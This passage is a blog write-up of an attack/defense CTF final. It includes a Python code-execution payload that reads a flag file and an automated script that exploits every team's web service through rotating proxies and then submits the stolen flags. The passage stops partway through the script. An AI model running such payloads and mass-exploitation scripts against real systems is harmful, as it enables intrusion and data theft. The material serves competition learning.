<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="megat">


    <meta name="subtitle" content="that one socially inept kid">


    <meta name="description" content="whoami">


    <meta name="keywords" content="aan, megat, ilikeronnnnii">


<title>SiberSiaga 2025 Final | aan</title>



    <link rel="icon" href="/favicon.png">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 7.3.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">aan&#39;s stash</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/music">Music</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">aan&#39;s stash</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/music">Music</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">SiberSiaga 2025 Final</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">megat</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">October 17, 2025&nbsp;&nbsp;14:20:59</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/Writeups/">Writeups</a>
                            
                                <a href="/categories/Writeups/Local-Competition/">Local Competition</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <p>life was so hectic it took me like a year later to write this, enjoy!</p>
<p>so theres a specific instance where you can submit the flag, after you managed to attack&#x2F;defend ur instances if im not mistaken i dont remember most of it already.</p>
<p><img src="/images/ihack/asdasd1231.png"></p>
<p>and every tick there will be new flags generated for each team.</p>
<ul>
<li>attack points | 2</li>
<li>defence points | -1 (if the other team submit your flag)</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C4ltex- 10.10.1.10</span><br><span class="line">C0UGH1NGB4BY - 10.10.2.10</span><br><span class="line">Takde Idea - 10.10.3.10</span><br><span class="line">GPT-10001 - 10.10.4.10</span><br><span class="line">0LDBEES - 10.10.5.10</span><br><span class="line"></span><br><span class="line">Game Server - 10.10.100.10</span><br><span class="line">Submit flag via nc 10.10.100.10 6666</span><br></pre></td></tr></table></figure>

<h1 id="Flag-Submission"><a href="#Flag-Submission" class="headerlink" title="Flag Submission"></a>Flag Submission</h1><p>in order to submit the flag u need to send it to your instance, since it can be a bit tedious cuz there are way too many flags we decided to make an automated script to submit it</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">submit_flags</span>(<span class="params">flags</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Submit flags to the server&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> flags:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  [-] No flags to submit!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  [*] Connecting to <span class="subst">&#123;SUBMIT_HOST&#125;</span>:<span class="subst">&#123;SUBMIT_PORT&#125;</span>...&quot;</span>)</span><br><span class="line">        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        sock.settimeout(<span class="number">10</span>)</span><br><span class="line">        sock.connect((SUBMIT_HOST, SUBMIT_PORT))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Read banner</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            banner = sock.recv(<span class="number">4096</span>).decode()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  <span class="subst">&#123;banner.strip()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  [*] Submitting flags...\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> flag <span class="keyword">in</span> flags:</span><br><span class="line">            sock.sendall(flag.encode() + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = sock.recv(<span class="number">4096</span>).decode()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  <span class="subst">&#123;flag&#125;</span> -&gt; <span class="subst">&#123;response.strip()&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  <span class="subst">&#123;flag&#125;</span> -&gt; No response&quot;</span>)</span><br><span class="line"></span><br><span class="line">        sock.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  [-] Error submitting: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="Web-Note"><a href="#Web-Note" class="headerlink" title="Web Note"></a>Web Note</h1><h1 id="Note-Port-16000"><a href="#Note-Port-16000" class="headerlink" title="Note (Port 16000)"></a>Note (Port 16000)</h1><p>The website is vulnerable to python arbitrary code execution.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&quot;/home/user/flag.txt&quot;</span>).read())</span><br></pre></td></tr></table></figure>

<p>Then we automate it to attack the rest of the IPs</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># Targets to try</span></span><br><span class="line">TARGETS = [</span><br><span class="line">    <span class="string">&quot;http://10.10.1.10:16000/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;http://10.10.2.10:16000/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;http://10.10.3.10:16000/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;http://10.10.4.10:16000/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;http://10.10.5.10:16000/&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Proxy list - Add your proxies here</span></span><br><span class="line"><span class="comment"># Format: &quot;http://proxy_ip:port&quot; or &quot;http://user:pass@proxy_ip:port&quot;</span></span><br><span class="line">PROXIES_LIST = [</span><br><span class="line">    <span class="string">&quot;http://10.10.130.23:12378&quot;</span>,</span><br><span class="line">    <span class="comment"># Add more proxies here if you have them</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set to True to enable proxy usage</span></span><br><span class="line">USE_PROXY = <span class="literal">True</span>  <span class="comment"># Proxy is now enabled</span></span><br><span class="line"></span><br><span class="line">SUBMIT_HOST = <span class="string">&quot;10.10.100.10&quot;</span></span><br><span class="line">SUBMIT_PORT = <span class="number">6666</span></span><br><span class="line">INTERVAL = <span class="number">60</span>  <span class="comment"># 1 minute in seconds (change to 240 for 4 minutes)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_random_proxy</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Get a random proxy from the list&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> PROXIES_LIST <span class="keyword">or</span> <span class="keyword">not</span> USE_PROXY:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    proxy = random.choice(PROXIES_LIST)</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;http&#x27;</span>: proxy,</span><br><span class="line">        <span class="string">&#x27;https&#x27;</span>: proxy</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flags</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Extract flags from all targets&quot;&quot;&quot;</span></span><br><span class="line">    flags = []</span><br><span class="line">    <span class="keyword">for</span> target <span class="keyword">in</span> TARGETS:</span><br><span class="line">        team = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            team = target.split(<span class="string">&quot;.&quot;</span>)[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Get proxy for this request</span></span><br><span class="line">            proxies = get_random_proxy()</span><br><span class="line">            proxy_info = <span class="string">f&quot; via <span class="subst">&#123;proxies[<span class="string">&#x27;http&#x27;</span>]&#125;</span>&quot;</span> <span class="keyword">if</span> proxies <span class="keyword">else</span> <span class="string">&quot; (direct)&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  [*] Trying Team <span class="subst">&#123;team&#125;</span> at <span class="subst">&#123;target&#125;</span><span class="subst">&#123;proxy_info&#125;</span>...&quot;</span>)</span><br><span class="line"></span><br><span class="line">            headers = &#123;</span><br><span class="line">                <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            data = &#123;<span class="string">&#x27;cmd&#x27;</span>: <span class="string">&#x27;print(open(&quot;flag.txt&quot;).read())&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Make request with or without proxy</span></span><br><span class="line">            response = requests.post(</span><br><span class="line">                target,</span><br><span class="line">                headers=headers,</span><br><span class="line">                data=data,</span><br><span class="line">                timeout=<span class="number">10</span>,</span><br><span class="line">                proxies=proxies</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  [*] Team <span class="subst">&#123;team&#125;</span>: Status <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                found_flags = re.findall(<span class="string">r&#x27;SIBER25_[A-Za-z0-9+/=]+&#x27;</span>, response.text)</span><br><span class="line">                <span class="keyword">if</span> found_flags:</span><br><span class="line">                    flag = found_flags[-<span class="number">1</span>]</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  [+] Team <span class="subst">&#123;team&#125;</span>: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">                    flags.append(flag)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  [-] Team <span class="subst">&#123;team&#125;</span>: No flags found in response&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> response.status_code == <span class="number">403</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  [!] Team <span class="subst">&#123;team&#125;</span>: FORBIDDEN - IP might be blocked!&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  [-] Team <span class="subst">&#123;team&#125;</span>: Unexpected status code&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.Timeout:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  [-] Team <span class="subst">&#123;team&#125;</span>: Timeout after 10 seconds&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ConnectionError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  [-] Team <span class="subst">&#123;team&#125;</span>: Connection Error - <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ProxyError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  [-] Team <span class="subst">&#123;team&#125;</span>: Proxy Error - <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  [-] Team <span class="subst">&#123;team&#125;</span>: Request Error - <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  [-] Team <span class="subst">&#123;team <span class="keyword">if</span> team <span class="keyword">else</span> <span class="string">&#x27;Unknown&#x27;</span>&#125;</span>: Unexpected Error - <span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n  [*] Completed scanning all <span class="subst">&#123;<span class="built_in">len</span>(TARGETS)&#125;</span> targets&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> flags</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit_flags</span>(<span class="params">flags</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Submit flags to the server&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> flags:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  [-] No flags to submit!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  [*] Connecting to <span class="subst">&#123;SUBMIT_HOST&#125;</span>:<span class="subst">&#123;SUBMIT_PORT&#125;</span>...&quot;</span>)</span><br><span class="line">        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        sock.settimeout(<span class="number">10</span>)</span><br><span class="line">        sock.connect((SUBMIT_HOST, SUBMIT_PORT))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Read banner</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            banner = sock.recv(<span class="number">4096</span>).decode()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  <span class="subst">&#123;banner.strip()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  [*] Submitting flags...\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> flag <span class="keyword">in</span> flags:</span><br><span class="line">            sock.sendall(flag.encode() + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = sock.recv(<span class="number">4096</span>).decode()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  <span class="subst">&#123;flag&#125;</span> -&gt; <span class="subst">&#123;response.strip()&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  <span class="subst">&#123;flag&#125;</span> -&gt; No response&quot;</span>)</span><br><span class="line"></span><br><span class="line">        sock.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  [+] Flag submission complete&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> socket.timeout:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  [-] Socket timeout when submitting&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> ConnectionRefusedError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  [-] Connection refused to <span class="subst">&#123;SUBMIT_HOST&#125;</span>:<span class="subst">&#123;SUBMIT_PORT&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  [-] Error submitting: <span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_proxies</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Test all proxies to see which ones work&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> PROXIES_LIST:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] No proxies configured&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[*] Testing proxies...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">70</span>)</span><br><span class="line">    working_proxies = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> proxy <span class="keyword">in</span> PROXIES_LIST:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            proxies = &#123;<span class="string">&#x27;http&#x27;</span>: proxy, <span class="string">&#x27;https&#x27;</span>: proxy&#125;</span><br><span class="line">            response = requests.get(</span><br><span class="line">                <span class="string">&quot;http://httpbin.org/ip&quot;</span>,</span><br><span class="line">                proxies=proxies,</span><br><span class="line">                timeout=<span class="number">5</span></span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                ip = response.json().get(<span class="string">&#x27;origin&#x27;</span>, <span class="string">&#x27;Unknown&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  [+] <span class="subst">&#123;proxy&#125;</span> -&gt; Working (IP: <span class="subst">&#123;ip&#125;</span>)&quot;</span>)</span><br><span class="line">                working_proxies.append(proxy)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  [-] <span class="subst">&#123;proxy&#125;</span> -&gt; Failed (Status: <span class="subst">&#123;response.status_code&#125;</span>)&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  [-] <span class="subst">&#123;proxy&#125;</span> -&gt; Failed (<span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[*] Working proxies: <span class="subst">&#123;<span class="built_in">len</span>(working_proxies)&#125;</span>/<span class="subst">&#123;<span class="built_in">len</span>(PROXIES_LIST)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">70</span>)</span><br><span class="line">    <span class="keyword">return</span> working_proxies</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Automated Flag Stealer - Running every minute&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> USE_PROXY:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Proxy mode: ENABLED (<span class="subst">&#123;<span class="built_in">len</span>(PROXIES_LIST)&#125;</span> proxies configured)&quot;</span>)</span><br><span class="line">        <span class="comment"># Optionally test proxies on startup</span></span><br><span class="line">        